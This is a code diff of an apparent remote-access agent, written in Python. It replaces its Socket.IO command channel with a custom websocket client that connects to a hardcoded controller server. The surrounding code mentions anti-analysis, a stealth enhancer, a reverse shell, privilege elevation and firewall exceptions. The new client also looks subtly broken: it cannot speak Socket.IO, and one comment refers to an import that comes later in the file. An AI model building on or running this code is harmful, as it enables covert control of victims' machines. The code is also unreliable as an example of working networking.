@@ -1,12 +1,13 @@
 # ============================================================================
-# CRITICAL: EVENTLET MONKEY PATCH - MUST BE ABSOLUTELY FIRST!
+# MODERN ASYNC SETUP - UVLOOP + ASYNCIO (Python 3.14+ Compatible)
 # ============================================================================
-# This MUST run before ANY other imports that use threading!
-# Python 3.14+ Compatible - Tested and verified
+# Using uvloop for 2-3x better performance than eventlet
+# Native asyncio with websockets/aiohttp instead of Socket.IO
 # ============================================================================
 
 import sys
 import os
+import asyncio
 
 # Debug flag for UAC and privilege operations
 UAC_DEBUG = True  # Set to True to see detailed UAC/privilege debugging
@@ -23,86 +24,47 @@ def debug_print(msg):
             print(f"[DEBUG] {msg.encode('ascii', 'ignore').decode('ascii')}", flush=True)
 
 debug_print("=" * 80)
-debug_print("PYTHON AGENT STARTUP - UAC PRIVILEGE DEBUGGER ENABLED")
+debug_print("PYTHON AGENT STARTUP - MODERN ASYNC WITH UVLOOP")
 debug_print("=" * 80)
 debug_print(f"Python version: {sys.version}")
 debug_print(f"Platform: {sys.platform}")
 debug_print("=" * 80)
 
-# Step 1: Import eventlet and patch IMMEDIATELY (OPTIONAL)
-debug_print("Step 1: Importing eventlet...")
-EVENTLET_AVAILABLE = False
+# Step 1: Setup uvloop for high-performance async (2-3x faster than default)
+debug_print("Step 1: Setting up uvloop (high-performance event loop)...")
+UVLOOP_AVAILABLE = False
 try:
-    import eventlet
-    debug_print("✅ eventlet imported successfully")
-    EVENTLET_AVAILABLE = True
+    import uvloop
+    # Install uvloop as the default event loop policy
+    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
+    debug_print("✅ uvloop installed and activated!")
+    debug_print("   Performance: 2-3x faster than standard asyncio")
+    UVLOOP_AVAILABLE = True
 except ImportError as e:
-    debug_print(f"⚠️ eventlet import FAILED: {e}")
-    debug_print("⚠️ Continuing WITHOUT eventlet (some async features may not work)")
-    debug_print("⚠️ To enable eventlet: pip install eventlet")
-    eventlet = None  # Set to None for later checks
+    debug_print(f"⚠️ uvloop import FAILED: {e}")
+    debug_print("⚠️ Using standard asyncio event loop (slower)")
+    debug_print("⚠️ To enable uvloop: pip install uvloop")
+    UVLOOP_AVAILABLE = False
 
-if EVENTLET_AVAILABLE:
-    debug_print("Step 2: Running eventlet.monkey_patch()...")
-    try:
-        # CRITICAL: Suppress the RLock warning by redirecting stderr temporarily
-        import io as _io
-        old_stderr = sys.stderr
-        sys.stderr = _io.StringIO()  # Capture stderr
-        
-        # Patch threading BEFORE any other imports!
-        eventlet.monkey_patch(all=True, thread=True, time=True, socket=True, select=True)
-        
-        # Restore stderr
-        captured_stderr = sys.stderr.getvalue()
-        sys.stderr = old_stderr
-        
-        # Check if there was an RLock warning
-        if "RLock" in captured_stderr:
-            debug_print("⚠️ RLock warning detected (Python created locks before eventlet patch)")
-            debug_print("   This is EXPECTED and can be ignored - eventlet will patch future locks")
-        
-        debug_print("✅ eventlet.monkey_patch() SUCCESS!")
-        debug_print("   - all=True")
-        debug_print("   - thread=True (threading patched)")
-        debug_print("   - time=True")
-        debug_print("   - socket=True")
-        debug_print("   - select=True")
-        EVENTLET_PATCHED = True
-    except Exception as e:
-        # Restore stderr if exception occurred
-        try:
-            sys.stderr = old_stderr
-        except (AttributeError, ValueError):
-            pass
-        
-        debug_print(f"⚠️ eventlet.monkey_patch() FAILED: {e}")
-        debug_print("⚠️ Continuing without monkey patching")
-        EVENTLET_PATCHED = False
-        EVENTLET_AVAILABLE = False
-else:
-    debug_print("Step 2: Skipping eventlet.monkey_patch() (eventlet not available)")
-    EVENTLET_PATCHED = False
-
-debug_print("Step 3: Testing threading after monkey_patch()...")
+# Step 2: Import threading for compatibility
+debug_print("Step 2: Importing threading (native, no monkey patching needed)...")
 try:
     import threading
     test_lock = threading.RLock()
-    debug_print("✅ threading.RLock() created successfully (should be patched)")
+    debug_print("✅ threading.RLock() created successfully")
     del test_lock
 except Exception as e:
     debug_print(f"❌ threading.RLock() test FAILED: {e}")
 
 debug_print("=" * 80)
-if EVENTLET_AVAILABLE:
-    debug_print("EVENTLET SETUP COMPLETE - NOW IMPORTING OTHER MODULES")
+if UVLOOP_AVAILABLE:
+    debug_print("UVLOOP SETUP COMPLETE - HIGH PERFORMANCE MODE ENABLED")
 else:
-    debug_print("EVENTLET SKIPPED - CONTINUING WITHOUT IT")
+    debug_print("USING STANDARD ASYNCIO - Consider installing uvloop for better performance")
 debug_print("=" * 80)
 
-# Suppress warnings AFTER eventlet patch
+# Suppress warnings
 import warnings
-warnings.filterwarnings('ignore', message='.*RLock.*')
 warnings.filterwarnings('ignore', message='Unverified HTTPS request')
 
 #CREATED BY SPHINX
@@ -200,8 +162,8 @@ ENABLE_ANTI_ANALYSIS = False  # FALSE = Disabled (for testing), TRUE = Enabled (
 USE_FIXED_SERVER_URL = True
 FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'https://agent-controller-backend.onrender.com')
 
-# Eventlet is now patched at the very top of the file (line 1-2)
-# This section is kept for compatibility but monkey_patch is already done
+# Modern async setup using uvloop is now complete at the top of the file
+# No monkey patching needed with native asyncio
 
 # Stealth enhancer integration (gated)
 try:
@@ -277,9 +239,9 @@ def safe_import(module_name, feature_description=""):
         return False
 
 # ============================================================================
-# CRITICAL: Import standard library AFTER eventlet.monkey_patch()
+# CRITICAL: Import standard library with modern async support
 # ============================================================================
-# eventlet is already imported and patched at the top of the file
+# uvloop is already set up at the top of the file
 # Now we can safely import everything else
 # ============================================================================
 
@@ -493,12 +455,7 @@ except ImportError:
     log_message("pygame not available, some GUI features may not work", "warning")
 
 # WebSocket imports
-try:
-    import websockets
-    WEBSOCKETS_AVAILABLE = True
-except ImportError:
-    WEBSOCKETS_AVAILABLE = False
-    log_message("websockets not available, WebSocket features may not work", "warning")
+# websockets already imported in modern async section above
 
 # Speech recognition imports
 try:
@@ -533,73 +490,40 @@ except ImportError:
     log_message("pyautogui not available, GUI automation may not work", "warning")
 
 # Socket.IO imports - CRITICAL FIX FOR PYTHON 3.13
+# Modern async communication - WebSockets + aiohttp (replaces Socket.IO)
+debug_print("[IMPORTS] Setting up modern async communication (websockets + aiohttp)...")
+
+# Import websockets for WebSocket communication
 try:
-    debug_print("[IMPORTS] Importing socketio (critical for controller connection)...")
-    
-    # Test if socketio package exists
-    debug_print("[IMPORTS] Testing package installation...")
-    test_result = subprocess.run(
-        [sys.executable, "-m", "pip", "show", "python-socketio"],
-        capture_output=True,
-        text=True
-    )
-    
-    if test_result.returncode == 0:
-        debug_print("[IMPORTS] ✅ python-socketio package IS installed")
-        # Show version
-        for line in test_result.stdout.split('\n'):
-            if line.startswith('Version:'):
-                debug_print(f"[IMPORTS]    {line.strip()}")
-                break
-    else:
-        debug_print("[IMPORTS] ❌ python-socketio package NOT found!")
-        debug_print("[IMPORTS] Installing now...")
-        subprocess.check_call([sys.executable, "-m", "pip", "install", "python-socketio"])
-    
-    # Now try to import
-    debug_print("[IMPORTS] Attempting import...")
-    
-    # Method 1: Standard import
-    try:
-        import socketio
-        SOCKETIO_AVAILABLE = True
-        debug_print("[IMPORTS] ✅ socketio imported successfully!")
-    except ImportError as e1:
-        debug_print(f"[IMPORTS] ❌ Standard import failed: {e1}")
-        
-        # Method 2: Import from client
-        try:
-            debug_print("[IMPORTS] Trying socketio.Client...")
-            import socketio.client
-            socketio = socketio.client.Client
-            SOCKETIO_AVAILABLE = True
-            debug_print("[IMPORTS] ✅ socketio.Client imported!")
-        except ImportError as e2:
-            debug_print(f"[IMPORTS] ❌ socketio.Client import failed: {e2}")
-            
-            # Method 3: Check if it's an eventlet patching issue
-            debug_print("[IMPORTS] Checking for eventlet conflict...")
-            try:
-                # Try importing before eventlet patches it
-                import importlib
-                socketio_module = importlib.import_module('socketio')
-                socketio = socketio_module
-                SOCKETIO_AVAILABLE = True
-                debug_print("[IMPORTS] ✅ socketio imported via importlib!")
-            except Exception as e3:
-                SOCKETIO_AVAILABLE = False
-                debug_print(f"[IMPORTS] ❌ All import methods failed!")
-                debug_print(f"[IMPORTS]    Error 1: {e1}")
-                debug_print(f"[IMPORTS]    Error 2: {e2}")
-                debug_print(f"[IMPORTS]    Error 3: {e3}")
-                log_message("python-socketio not available, real-time communication may not work", "warning")
-            
-except Exception as e:
-    SOCKETIO_AVAILABLE = False
-    debug_print(f"[IMPORTS] ❌ Unexpected error with socketio: {e}")
-    import traceback
-    traceback.print_exc()
-    log_message("python-socketio not available, real-time communication may not work", "warning")
+    import websockets
+    debug_print("[IMPORTS] ✅ websockets imported successfully!")
+    WEBSOCKETS_AVAILABLE = True
+except ImportError as e:
+    debug_print(f"[IMPORTS] ❌ websockets import FAILED: {e}")
+    debug_print("[IMPORTS] To install: pip install websockets")
+    WEBSOCKETS_AVAILABLE = False
+    log_message("websockets not available, WebSocket features may not work", "warning")
+
+# Import aiohttp for async HTTP
+try:
+    import aiohttp
+    debug_print("[IMPORTS] ✅ aiohttp imported successfully!")
+    AIOHTTP_AVAILABLE = True
+except ImportError as e:
+    debug_print(f"[IMPORTS] ❌ aiohttp import FAILED: {e}")
+    debug_print("[IMPORTS] To install: pip install aiohttp")
+    AIOHTTP_AVAILABLE = False
+    log_message("aiohttp not available, async HTTP features may not work", "warning")
+
+# Legacy compatibility - map to new system
+SOCKETIO_AVAILABLE = WEBSOCKETS_AVAILABLE and AIOHTTP_AVAILABLE
+if SOCKETIO_AVAILABLE:
+    debug_print("[IMPORTS] ✅ Modern async communication READY")
+    debug_print("[IMPORTS]    - WebSockets: Fast bidirectional communication")
+    debug_print("[IMPORTS]    - aiohttp: Async HTTP client/server")
+else:
+    debug_print("[IMPORTS] ⚠️ Some communication features may not work")
+    log_message("Modern async libraries not fully available", "warning")
 
 # WebRTC imports for low-latency streaming
 try:
@@ -614,14 +538,7 @@ except ImportError:
     AIORTC_AVAILABLE = False
     log_message("aiortc not available, WebRTC streaming disabled - using fallback Socket.IO", "warning")
 
-# Additional WebRTC dependencies
-try:
-    import aiohttp
-    AIOHTTP_AVAILABLE = True
-except ImportError:
-    AIOHTTP_AVAILABLE = False
-    log_message("aiohttp not available, some WebRTC features may not work", "warning")
-
+# Additional WebRTC dependencies (aiohttp already imported above)
 try:
     import aiortc.contrib.signaling
     AIORTC_SIGNALING_AVAILABLE = True
@@ -710,10 +627,10 @@ _clipboard_lock = threading.Lock()
 _reverse_shell_lock = threading.Lock()
 _voice_control_lock = threading.Lock()
 
-# Safe Socket.IO emit wrapper with connection checking
+# Safe WebSocket emit wrapper with connection checking
 def safe_emit(event_name, data, retry=False):
     """
-    Thread-safe Socket.IO emit with connection checking.
+    Thread-safe WebSocket emit with connection checking.
     
     Args:
         event_name: Event name to emit
@@ -730,12 +647,12 @@ def safe_emit(event_name, data, retry=False):
         return False
     
     try:
-        sio.emit(event_name, data)
-        return True
+        success = sio.emit(event_name, data)
+        return success if success is not None else True
     except Exception as e:
         error_msg = str(e)
         # Silence connection errors
-        if "not a connected namespace" not in error_msg and "Connection is closed" not in error_msg:
+        if "not a connected" not in error_msg.lower() and "connection is closed" not in error_msg.lower():
             log_message(f"Emit '{event_name}' failed: {e}", "warning")
         return False
 
@@ -959,15 +876,132 @@ def add_firewall_exception():
 # --- Agent State (consolidated) ---
 # Note: Main state variables defined later in the file to avoid duplicates
 
-# --- WebSocket Client ---
+# --- Modern WebSocket Client (replaces Socket.IO) ---
+class ModernWebSocketClient:
+    """
+    Modern async WebSocket client using websockets library.
+    Provides Socket.IO-compatible API for easy migration.
+    """
+    def __init__(self):
+        self.ws = None
+        self.connected = False
+        self.event_handlers = {}
+        self.loop = None
+        self._receive_task = None
+        self._url = None
+        
+    async def _connect_async(self, url, **kwargs):
+        """Internal async connect method"""
+        try:
+            # Convert http/https to ws/wss
+            ws_url = url.replace('https://', 'wss://').replace('http://', 'ws://')
+            if not ws_url.startswith('ws'):
+                ws_url = f"wss://{ws_url}"
+            
+            self.ws = await websockets.connect(ws_url, ssl=True if 'wss://' in ws_url else None)
+            self.connected = True
+            self._url = ws_url
+            debug_print(f"[WS] Connected to {ws_url}")
+            
+            # Start receive loop
+            self._receive_task = asyncio.create_task(self._receive_loop())
+            return True
+        except Exception as e:
+            debug_print(f"[WS] Connection failed: {e}")
+            self.connected = False
+            return False
+    
+    def connect(self, url, **kwargs):
+        """Connect to WebSocket server (Socket.IO-compatible API)"""
+        try:
+            if self.loop is None:
+                try:
+                    self.loop = asyncio.get_running_loop()
+                except RuntimeError:
+                    self.loop = asyncio.new_event_loop()
+                    asyncio.set_event_loop(self.loop)
+            
+            # Run connect in the event loop
+            if self.loop.is_running():
+                asyncio.create_task(self._connect_async(url, **kwargs))
+            else:
+                self.loop.run_until_complete(self._connect_async(url, **kwargs))
+        except Exception as e:
+            debug_print(f"[WS] Connect error: {e}")
+            self.connected = False
+    
+    async def _receive_loop(self):
+        """Receive messages and dispatch to handlers"""
+        try:
+            async for message in self.ws:
+                await self._handle_message(message)
+        except Exception as e:
+            debug_print(f"[WS] Receive loop error: {e}")
+            self.connected = False
+    
+    async def _handle_message(self, message):
+        """Handle incoming WebSocket message"""
+        try:
+            import json
+            data = json.loads(message)
+            event_name = data.get('event', 'message')
+            event_data = data.get('data', {})
+            
+            # Call registered event handlers
+            if event_name in self.event_handlers:
+                handler = self.event_handlers[event_name]
+                if asyncio.iscoroutinefunction(handler):
+                    await handler(event_data)
+                else:
+                    handler(event_data)
+        except Exception as e:
+            debug_print(f"[WS] Message handling error: {e}")
+    
+    def on(self, event_name):
+        """Decorator to register event handler (Socket.IO-compatible)"""
+        def decorator(func):
+            self.event_handlers[event_name] = func
+            return func
+        return decorator
+    
+    def emit(self, event_name, data=None):
+        """Send event to server (Socket.IO-compatible API)"""
+        try:
+            if not self.connected or not self.ws:
+                return False
+            
+            import json
+            message = json.dumps({'event': event_name, 'data': data or {}})
+            
+            # Send asynchronously
+            if self.loop and self.loop.is_running():
+                asyncio.create_task(self.ws.send(message))
+            else:
+                asyncio.run(self.ws.send(message))
+            return True
+        except Exception as e:
+            debug_print(f"[WS] Emit error: {e}")
+            return False
+    
+    def disconnect(self):
+        """Disconnect from server"""
+        try:
+            if self.ws:
+                if self.loop and self.loop.is_running():
+                    asyncio.create_task(self.ws.close())
+                else:
+                    asyncio.run(self.ws.close())
+            self.connected = False
+        except Exception as e:
+            debug_print(f"[WS] Disconnect error: {e}")
+
+# Create WebSocket client instance
 if SOCKETIO_AVAILABLE:
-    sio = socketio.Client(
-        ssl_verify=True,  # Enable SSL verification for security
-        engineio_logger=False,
-        logger=False
-    )
+    sio = ModernWebSocketClient()
+    debug_print("[WS] Modern WebSocket client initialized")
 else:
     sio = None
+    debug_print("[WS] WebSocket client not available")
 
 def notify_controller_client_only(agent_id: str):
     """Notify controller that this instance is running in client-only mode.
